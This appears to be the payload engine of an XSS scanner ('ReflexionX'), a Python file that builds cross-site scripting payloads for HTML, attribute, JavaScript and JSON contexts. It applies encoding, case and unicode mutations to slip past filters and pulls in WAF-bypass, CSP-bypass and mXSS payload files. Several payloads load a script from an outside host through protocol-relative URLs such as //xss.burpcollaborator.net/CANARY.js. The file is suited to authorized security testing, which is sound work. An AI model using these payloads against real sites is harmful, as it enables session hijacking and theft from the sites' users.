#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Context-Aware Payload Engine
Replaces static payload lists with intelligent, context-driven generation.

Generates payloads dynamically based on:
  - Reflection context (HTML body, attribute, JS, JSON)
  - Character encoding observed
  - Quote type surrounding reflection
  - CSP constraints

Falls back to static payload files in ``payloads/`` when the generator
produces nothing or when explicitly requested.

Usage:
    from payload_engine import PayloadEngine
    engine = PayloadEngine(canary="HF5XSSCONFIRMED")
    payloads = engine.generate(context="html_attribute", encoding="raw",
                               quote_type="double", csp={"inline_allowed": False})
"""

import os, re, random, argparse
from urllib.parse import quote as url_quote

CANARY_DEFAULT = "HF5XSSCONFIRMED"

# ── Context Breakers ─────────────────────────────────────────
CONTEXT_BREAKERS = {
    "html_body": ["", "<"],               # already in body, just inject tag
    "html_attribute": {
        "double": ['"', '" '],             # break double-quoted attr
        "single": ["'", "' "],             # break single-quoted attr
        "none":   [" ", " "],              # unquoted attribute
    },
    "javascript": {
        "double": ['"', '";'],
        "single": ["'", "';"],
        "backtick": ["`", "`;"],
        "none": ["", ";"],
    },
    "json": {
        "double": ['"', '"}'],
        "single": ["'", "'}"],
        "none": ["", "};"],
    },
}

# ── Execution Primitives ─────────────────────────────────────
# Each returns a string that sets window._xss_confirmed = CANARY
def _evt_img(canary):
    return f"<img src=x onerror=window._xss_confirmed='{canary}'>"

def _evt_svg(canary):
    return f"<svg onload=window._xss_confirmed='{canary}'>"

def _evt_details(canary):
    return f"<details open ontoggle=window._xss_confirmed='{canary}'>"

def _evt_input(canary):
    return f"<input onfocus=window._xss_confirmed='{canary}' autofocus>"

def _evt_body(canary):
    return f"<body onload=window._xss_confirmed='{canary}'>"

def _evt_video(canary):
    return f"<video src=x onerror=window._xss_confirmed='{canary}'>"

def _evt_marquee(canary):
    return f"<marquee onstart=window._xss_confirmed='{canary}'>"

def _evt_div_focus(canary):
    return f"<div id=x tabindex=1 onfocus=window._xss_confirmed='{canary}'></div>"

def _evt_animation(canary):
    return f"<style>@keyframes x{{}}</style><div style=\"animation-name:x\" onanimationstart=window._xss_confirmed='{canary}'>"

def _evt_onsearch(canary):
    return f"<input autofocus onsearch=window._xss_confirmed='{canary}'>"

def _evt_onbeforeprint(canary):
    return f"<body onbeforeprint=window._xss_confirmed='{canary}'>"

def _evt_onpageshow(canary):
    return f"<frameset onpageshow=window._xss_confirmed='{canary}'>"

def _evt_math_img(canary):
    # Uses <math> tag, rare HTML parser
    return f"<math><mtext><table><mglyph><style><!--</style><img src=x onerror=window._xss_confirmed='{canary}'></table></mtext></math>"

def _evt_svg_base(canary):
    return f"<svg><base href=javascript:window._xss_confirmed='{canary}'/>"

def _evt_iframe_srcdoc(canary):
    return f"<iframe srcdoc=\"<img src=x onerror=window._xss_confirmed='{canary}'>\">"

def _evt_form_action(canary):
    return f"<form action=javascript:window._xss_confirmed='{canary}'><input type=submit>"

def _evt_audio_src(canary):
    return f"<audio src=x onerror=window._xss_confirmed='{canary}'>"

def _script_tag(canary):
    return f"<script>window._xss_confirmed='{canary}'</script>"

def _script_close_inject(canary):
    return f"</script><script>window._xss_confirmed='{canary}'</script>"

def _js_assignment(canary):
    return f"window._xss_confirmed='{canary}'"

def _attr_onfocus(canary, quote='"'):
    return f"{quote} onfocus=window._xss_confirmed='{canary}' autofocus={quote}"

def _attr_onmouseover(canary, quote='"'):
    return f"{quote} onmouseover=window._xss_confirmed='{canary}' {quote}"

def _attr_onclick(canary, quote='"'):
    return f"{quote} onclick=window._xss_confirmed='{canary}' {quote}"


def _protocol_relative_url(canary, host="xss.burpcollaborator.net", path="/payload.js"):
    """Protocol-relative URL — bypasses ^https?:// regex blacklists (Level 6)."""
    return f"//{host}{path}"


def _javascript_uri(canary):
    return f"javascript:window._xss_confirmed='{canary}'"


def _data_uri(canary):
    return f"data:text/html,<script>window._xss_confirmed='{canary}'</script>"


def _oob_callback_url(canary, oob_domain="xss.burpcollaborator.net"):
    """OOB callback URL — useful for blind/stored XSS detection via DNS/HTTP callback."""
    return f"//{oob_domain}/{canary}"


# ── Event Handler Primitives (no <script> tags — CSP safe) ───
EVENT_PRIMITIVES = [
    _evt_img, _evt_svg, _evt_details, _evt_input,
    _evt_body, _evt_video, _evt_marquee, _evt_div_focus,
    _evt_animation, _evt_onsearch, _evt_onbeforeprint, _evt_onpageshow,
    _evt_math_img, _evt_svg_base, _evt_iframe_srcdoc, _evt_form_action,
    _evt_audio_src,
]

# ── Inline Script Primitives (require script-src 'unsafe-inline') ─
INLINE_PRIMITIVES = [_script_tag, _script_close_inject]


class PayloadEngine:
    """Context-aware XSS payload generator with mutation and fallback support."""

    def __init__(self, canary=None, payloads_dir=None):
        self.canary = canary or CANARY_DEFAULT
        self.payloads_dir = payloads_dir or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "payloads"
        )
        self._static_cache = {}

    # ── Public API ───────────────────────────────────────────
    def generate(self, context="html_body", encoding="raw",
                 quote_type="double", csp=None):
        """Generate context-aware payloads.

        Parameters
        ----------
        context : str
            One of: html_body, html_attribute, javascript, json, unknown
        encoding : str
            Observed encoding: raw, html_encoded, url_encoded, js_escaped
        quote_type : str
            Quote surrounding reflection: double, single, backtick, none
        csp : dict or None
            CSP constraints: {"inline_allowed": bool, "eval_allowed": bool}

        Returns
        -------
        list[str]
            Deduplicated list of payloads to attempt.
        """
        csp = csp or {}
        inline_ok = csp.get("inline_allowed", True)
        eval_ok = csp.get("eval_allowed", True)
        payloads = []

        if context == "html_body":
            payloads.extend(self._gen_html_body(inline_ok))
        elif context == "html_attribute":
            payloads.extend(self._gen_html_attr(quote_type, inline_ok))
        elif context == "javascript":
            payloads.extend(self._gen_javascript(quote_type, inline_ok, eval_ok))
        elif context == "json":
            payloads.extend(self._gen_json(quote_type, inline_ok))
        else:
            # unknown — try everything
            payloads.extend(self._gen_html_body(inline_ok))
            payloads.extend(self._gen_html_attr(quote_type, inline_ok))
            payloads.extend(self._gen_javascript(quote_type, inline_ok, eval_ok))

        # Apply encoding mutations if reflection is encoded
        if encoding != "raw":
            mutated = []
            for p in payloads:
                mutated.extend(self._encode_mutations(p, encoding))
            payloads.extend(mutated)

        # Deduplicate
        payloads = self._dedup(payloads)

        # If engine produced nothing, fall back to static files
        if not payloads:
            payloads = self.fallback_payloads(context)

        return payloads

    def mutate(self, payload, n=5):
        """Generate N encoding/case mutations of a payload."""
        mutations = [payload]
        mutations.extend(self._encode_mutations(payload, "url_encoded"))
        mutations.extend(self._case_mutations(payload))
        mutations.extend(self._unicode_mutations(payload))
        return self._dedup(mutations)[:n]

    def generate_advanced(self, context="html_body", encoding="raw",
                          quote_type="double", csp=None, waf_id=None):
        """v1.0.0: Generate comprehensive payloads including WAF bypass,
        mXSS, polyglots, rare handlers, and CSP bypass payloads."""
        # Start with standard context-aware payloads
        payloads = self.generate(context=context, encoding=encoding,
                                 quote_type=quote_type, csp=csp)

        # Add advanced payload categories
        payloads.extend(self._load_payload_file("polyglots.txt"))
        payloads.extend(self._load_payload_file("rare_handlers.txt"))
        payloads.extend(self._load_payload_file("mxss.txt"))
        payloads.extend(self._load_payload_file("advanced_waf_bypass.txt"))

        # CSP bypass payloads (only when CSP blocks inline scripts)
        if csp and not csp.get("inline_allowed", True):
            payloads.extend(self._load_payload_file("csp_bypass.txt"))

        # WAF evasion engine integration
        if waf_id:
            try:
                from waf_evasion_engine import WAFEvasionEngine
                engine = WAFEvasionEngine(canary=self.canary)
                waf_payloads = engine.generate_bypass(
                    waf_id=waf_id, context=context, max_payloads=30)
                payloads.extend([p["payload"] for p in waf_payloads])
            except ImportError:
                pass

        return self._dedup(payloads)

    def fallback_payloads(self, context):
        """Load static payloads from files in payloads/ directory."""
        ctx_file_map = {
            "html_body": "html_body.txt",
            "html_attribute": "html_attribute.txt",
            "javascript": "javascript.txt",
            "json": "json_break.txt",
            "dom_xss": "dom_xss.txt",
        }
        fname = ctx_file_map.get(context, "html_body.txt")
        return self._load_payload_file(fname)

    # ── Generators ───────────────────────────────────────────
    def _gen_html_body(self, inline_ok):
        c = self.canary
        payloads = []
        # Event handler payloads (CSP-safe)
        for fn in EVENT_PRIMITIVES:
            payloads.append(fn(c))
        # Inline script payloads (only if CSP allows)
        if inline_ok:
            for fn in INLINE_PRIMITIVES:
                payloads.append(fn(c))
        return payloads

    def _gen_html_attr(self, quote_type, inline_ok):
        c = self.canary
        payloads = []
        qt = quote_type or "double"
        q = '"' if qt == "double" else ("'" if qt == "single" else "")

        # Attribute-breaking event handlers
        payloads.append(_attr_onfocus(c, q))
        payloads.append(_attr_onmouseover(c, q))
        payloads.append(_attr_onclick(c, q))

        # Break out of attribute → inject tag
        payloads.append(f"{q}>{_evt_img(c)}")
        payloads.append(f"{q}>{_evt_svg(c)}")

        if inline_ok:
            payloads.append(f"{q}>{_script_tag(c)}")

        # href/src attribute: javascript: protocol
        payloads.append(f"javascript:window._xss_confirmed='{c}'")

        # Protocol-relative URL — bypasses ^https?:// regex blacklists (Level 6)
        payloads.append(_protocol_relative_url(c, host="xss.burpcollaborator.net", path=f"/{c}.js"))
        payloads.append(_protocol_relative_url(c, host="xss.oastify.com", path=f"/{c}"))

        # data: URI
        payloads.append(_data_uri(c))

        # OOB callback URL
        payloads.append(_oob_callback_url(c, oob_domain="xss.burpcollaborator.net"))

        # Attribute argument breakout (e.g. Level 4: onload="startTimer('...')")
        payloads.append(f"3{q}) window._xss_confirmed='{c}';//")
        payloads.append(f"3{q}) alert('{c}');//")
        payloads.append(f"1{q} onerror=window._xss_confirmed='{c}'//")

        return payloads

    def _gen_javascript(self, quote_type, inline_ok, eval_ok):
        c = self.canary
        payloads = []
        qt = quote_type or "single"

        if qt == "double":
            payloads.append(f'";{_js_assignment(c)}//')
            payloads.append(f'\\";{_js_assignment(c)}//')
            payloads.append(f'"-{_js_assignment(c)}-"')
        elif qt == "single":
            payloads.append(f"';{_js_assignment(c)}//")
            payloads.append(f"\\';{_js_assignment(c)}//")
            payloads.append(f"'-{_js_assignment(c)}-'")
        elif qt == "backtick":
            payloads.append(f"`;{_js_assignment(c)}//")
            payloads.append(f"${{window._xss_confirmed='{c}'}}")
        else:
            payloads.append(f";{_js_assignment(c)};")

        # Close script block and inject
        if inline_ok:
            payloads.append(f"{_script_close_inject(c)}")
            payloads.append(f"</script>{_evt_img(c)}")

        # Closure-breaking
        payloads.append(f"}}}};{_js_assignment(c)};//")
        payloads.append(f"]);{_js_assignment(c)};//")

        return payloads

    def _gen_json(self, quote_type, inline_ok):
        c = self.canary
        payloads = []

        if inline_ok:
            payloads.append(f'"}}' + _script_close_inject(c))
            payloads.append(f'"}}]}}' + _script_close_inject(c))
        payloads.append(f'"}}' + _evt_img(c))
        payloads.append(f'\\\\"}}}}{_evt_svg(c)}')

        return payloads

    # ── Mutation Strategies ──────────────────────────────────
    def _encode_mutations(self, payload, encoding):
        mutations = []
        if encoding == "url_encoded" or encoding == "html_encoded":
            mutations.append(url_quote(payload, safe=""))
            mutations.append(url_quote(url_quote(payload, safe=""), safe=""))  # double encode
        if encoding == "html_encoded":
            mutations.append(payload.replace("<", "&lt;").replace(">", "&gt;"))
            # Try numeric entity bypass
            mutations.append(payload.replace("<", "&#60;").replace(">", "&#62;"))
        return mutations

    def _case_mutations(self, payload):
        mutations = []
        # Mixed case for tags
        tags = re.findall(r'</?(\w+)', payload)
        if tags:
            mixed = payload
            for tag in tags:
                mixed_tag = ''.join(
                    c.upper() if i % 2 else c.lower() for i, c in enumerate(tag)
                )
                mixed = mixed.replace(f"<{tag}", f"<{mixed_tag}", 1)
                mixed = mixed.replace(f"</{tag}", f"</{mixed_tag}", 1)
            mutations.append(mixed)
        return mutations

    def _unicode_mutations(self, payload):
        mutations = []
        # JavaScript Unicode escapes for common filtered chars
        js_unicode = payload.replace("alert", "\\u0061lert").replace("eval", "\\u0065val")
        if js_unicode != payload:
            mutations.append(js_unicode)
        return mutations

    # ── Helpers ───────────────────────────────────────────────
    def _load_payload_file(self, filename):
        if filename in self._static_cache:
            return list(self._static_cache[filename])
        fpath = os.path.join(self.payloads_dir, filename)
        if not os.path.isfile(fpath):
            return []
        with open(fpath, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip()]
        # Replace CANARY placeholder with actual canary
        lines = [l.replace("CANARY", self.canary) for l in lines]
        self._static_cache[filename] = lines
        return list(lines)

    @staticmethod
    def _dedup(lst):
        seen = set()
        return [x for x in lst if x not in seen and not seen.add(x)]


# ── CLI self-test ────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ReflexionX v1.0.0 — Payload Engine self-test")
    parser.add_argument("--test", action="store_true")
    parser.add_argument("--context", default="html_body",
                        choices=["html_body", "html_attribute", "javascript", "json", "unknown"])
    parser.add_argument("--encoding", default="raw")
    parser.add_argument("--quote", default="double")
    parser.add_argument("--no-inline", action="store_true")
    args = parser.parse_args()

    if args.test:
        engine = PayloadEngine()

        # Test each context
        for ctx in ["html_body", "html_attribute", "javascript", "json", "unknown"]:
            payloads = engine.generate(context=ctx)
            assert len(payloads) > 0, f"No payloads for context: {ctx}"
            print(f"  [{ctx}] -> {len(payloads)} payloads generated")

        # Test CSP filtering
        csp_strict = {"inline_allowed": False, "eval_allowed": False}
        payloads_strict = engine.generate(context="html_body", csp=csp_strict)
        for p in payloads_strict:
            assert "<script>" not in p.lower(), f"CSP-blocked payload leaked: {p}"
        print(f"  [CSP strict] -> {len(payloads_strict)} payloads (no inline)")

        # Test mutations
        base = "<img src=x onerror=alert(1)>"
        mutated = engine.mutate(base, n=5)
        assert len(mutated) >= 1
        print(f"  [Mutations] -> {len(mutated)} variants of base payload")

        # Test fallback
        fb = engine.fallback_payloads("html_body")
        print(f"  [Fallback] -> {len(fb)} static payloads loaded")

        print("\n[OK] Payload engine self-test passed")
    else:
        engine = PayloadEngine()
        csp = None
        if args.no_inline:
            csp = {"inline_allowed": False}
        payloads = engine.generate(context=args.context, encoding=args.encoding,
                                   quote_type=args.quote, csp=csp)
        print(f"[*] Generated {len(payloads)} payloads for context={args.context}")
        for i, p in enumerate(payloads, 1):
            print(f"  {i:3d}. {p[:120]}")
